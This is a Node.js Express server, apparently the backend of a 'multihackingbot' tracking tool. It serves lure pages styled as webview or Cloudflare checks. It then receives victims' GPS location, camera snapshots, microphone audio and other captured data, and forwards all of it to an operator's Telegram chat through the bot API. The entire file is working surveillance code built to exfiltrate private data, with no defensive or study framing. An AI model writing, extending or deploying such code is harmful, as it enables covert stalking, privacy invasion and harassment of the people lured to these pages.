const express = require("express");
const compression = require("compression");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const os = require("os");
const ejs = require('ejs');
const axios = require("axios");
const FormData = require("form-data");
require('dotenv').config();
const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;

const hostURL = process.env.HOST_URL || "";
const hostURL2 = process.env.HOST_URL2 || "";
const use1pt = process.env.USE1PT || "";

var domainF = process.env.DOMAIN_FILTER || "example.com";

var homeDir = os.homedir();
var jsonDirectory = path.join(homeDir, "a1");

function tg(method, token, data, isForm = false) {
    const url = `https://api.telegram.org/bot${token}/${method}`;
    return axios.post(url, data, isForm ? { headers: data.getHeaders() } : {});
}

function getIp(req) {
    return req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket?.remoteAddress ||
        req.ip;
}

function appendToken(t) {
    return t;
}

app.use((req, res, next) => {
    if (req?.hostname?.includes(domainF)) return res.end();
    next();
});

app.use(compression());

app.use(bodyParser.json({ limit: "Infinity", type: "application/json" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "Infinity", type: "application/x-www-form-urlencoded" }));
app.use(bodyParser.raw({ inflate: true, limit: "Infinity", type: () => true }));

app.use(cors());

app.set("view engine", "ejs");
app.set("trust proxy", true);

app.get("/", (req, res) => {
    res.redirect("https://multihackingbot.onrender.com");
});

function handleRoute(view, host) {
    return (req, res) => {
        var b = req.query.b?.trim() || "qq6rytlk";
        var ip = getIp(req);
        var d = new Date().toISOString().slice(0, 19).replace("T", ":");

        res.render(view, {
            ip,
            time: d,
            url: `${hostURL}/crash`,
            uid: req.params.path,
            a: host,
            b,
            t: use1pt
        });
    };
}

app.get("/w/:path", handleRoute("webview", hostURL));
app.get("/c/:path", handleRoute("cloudflare", hostURL2));
app.get("/o/:path", handleRoute("ok", hostURL2));
app.get("/l/:path", handleRoute("cg", hostURL2));

app.get("/crash", (req, res) => res.render("crash"));

app.post("/location", async (req, res) => {
    try {
        var lat = decodeURIComponent(req.body.lat || "");
        var lon = decodeURIComponent(req.body.lon || "");
        var uidRaw = decodeURIComponent(req.body.uid || "");
        var acc = decodeURIComponent(req.body.acc || "");
        var t = req.body.t;

        if (!lat || !lon || !uidRaw || !acc || !t) {
            return res.status(400).send("Invalid data");
        }

        var uid = parseInt(uidRaw, 36);
        if (isNaN(uid)) return res.status(400).send("Invalid uid");

        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);

        if (t === "qq6rytlk") {
            await tg("sendMessage", token, {
                chat_id: uid,
                text: `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}`
            });
            return res.send("OK");
        }

        var formLoc = new FormData();
        formLoc.append("chat_id", uid);
        formLoc.append("latitude", lat);
        formLoc.append("longitude", lon);

        var formMsg = {
            chat_id: uid,
            text: `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}`
        };

        await Promise.all([
            tg("sendLocation", token, formLoc, true),
            tg("sendMessage", token, formMsg)
        ]);

        res.send("OK");
    } catch (e) {
        res.status(500).send(e.message);
    }
});

app.post("/", async (req, res) => {
    try {
        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
        var data = decodeURIComponent(req.body.data || "").replace(/<br>/g, "\n");
        var t = req.body.t;

        if (!uid || !data) return res.status(400).send("Invalid");

        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);

        await tg("sendMessage", token, {
            chat_id: uid,
            text: data,
            parse_mode: "HTML"
        });

        res.send("OK");
    } catch (e) {
        res.status(500).send(e.message);
    }
});

app.post("/cam-denied", async (req, res) => {
    try {
        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
        var text = decodeURIComponent(req.body.deniedText || "");
        var t = req.body.t;

        if (!uid || !text || !t) return res.status(400).send("Invalid");

        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);

        await tg("sendMessage", token, {
            chat_id: uid,
            text
        });

        res.send("OK");
    } catch (e) {
        res.status(500).send(e.message);
    }
});

app.post("/camsnap", async (req, res) => {
    try {
        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
        var img = req.body.img;
        var t = req.body.t;

        if (!uid || !img || !t) return res.status(400).send("Invalid");

        var buffer = Buffer.from(decodeURIComponent(img), "base64");
        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);

        var form = new FormData();
        form.append("chat_id", uid);
        form.append("photo", buffer, {
            filename: "camsnap.png",
            contentType: "image/png"
        });

        await tg("sendPhoto", token, form, true);

        res.send("OK");
    } catch (e) {
        res.status(500).send(e.message);
    }
});

app.post("/audiosnap", async (req, res) => {
    try {
        var uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
        var audio = req.body.audio;
        var t = req.body.t;

        if (!uid || !audio || !t) return res.status(400).send("Invalid");

        var buffer = Buffer.from(decodeURIComponent(audio), "base64");
        var token = t === "qq6rytlk" ? BOT_TOKEN : appendToken(t);

        var form = new FormData();
        form.append("chat_id", uid);
        form.append("audio", buffer, {
            filename: "audio.webm",
            contentType: "audio/webm"
        });

        await tg("sendAudio", token, form, true);

        res.send("OK");
    } catch (e) {
        res.status(500).send(e.message);
    }
});

var port = process.env.port || 8000;

app.listen(port, "0.0.0.0", async () => {
  console.log(`Server is running on port ${port}`);
  try {
    var res = await axios.get("https://ifconfig.me");
    console.log("Current IP:", res.data.trim());
  } catch (err) {
    console.error("Error fetching IP:", err.message);
  }
});
